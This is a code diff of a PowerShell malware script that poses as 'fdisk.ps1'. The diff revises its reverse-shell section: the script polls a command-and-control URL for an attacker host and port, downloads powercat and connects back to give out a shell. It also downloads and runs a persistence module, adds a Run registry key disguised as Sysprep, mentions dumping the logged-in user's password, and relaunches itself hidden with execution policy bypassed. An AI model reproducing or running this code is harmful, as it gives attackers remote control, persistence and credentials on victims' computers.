@@ -16,9 +16,9 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 
 	# add persistence
 	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
-	Add-Persistence -ScriptPath $MyInvocation.MyCommand.Path
+	Add-Persistence -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
 
-	# auto-run TODO
+	# auto-run
 	New-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run -Name Sysprep -PropertyType String -Value "C:\Windows\System32\Sysprep\sysprep.exe"
 
 	# dump login user password
@@ -33,27 +33,33 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 		Get-Job | Receive-Job | Out-File $strFileName
 	}
 
+	# reverse shell Start-Process -ArgumentList -c
+    $server = 'http://1.nekocode.sinaapp.com/my_host'
 
-	# reverse shell
-    start-process -WindowStyle Hidden powershell @'
-        $server = "http://1.nekocode.sinaapp.com/my_host"
-        $info = Invoke-RestMethod -Method Get -Uri $server
+    While(1) {
+        Try {
+            $attacker_host = Invoke-RestMethod -Method Get -Uri $server
+            $strPowercat = (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+            Break
+        } Catch {
+        }
 
-        While(1){
-			Try {
-				start-job {
-					IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
-					powercat -c $info.host -p $info.port -ep
-				}
-				get-job | wait-job
-			}
-			Catch {
-			}
-			Start-Sleep -Seconds 3
-		}
-'@
-	
-	
+        Start-Sleep -Seconds 3
+    }
+
+    While(1){
+        Try {
+            start-job -ArgumentList $attacker_host,$strPowercat {
+                param($attacker_host,$strPowercat)
+                IEX $strPowercat
+                powercat -c $attacker_host.host -p $attacker_host.port -ep
+            }
+            get-job | wait-job
+        } Catch {
+        }
+
+        Start-Sleep -Seconds 3
+    }
 	
 } else {
 	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
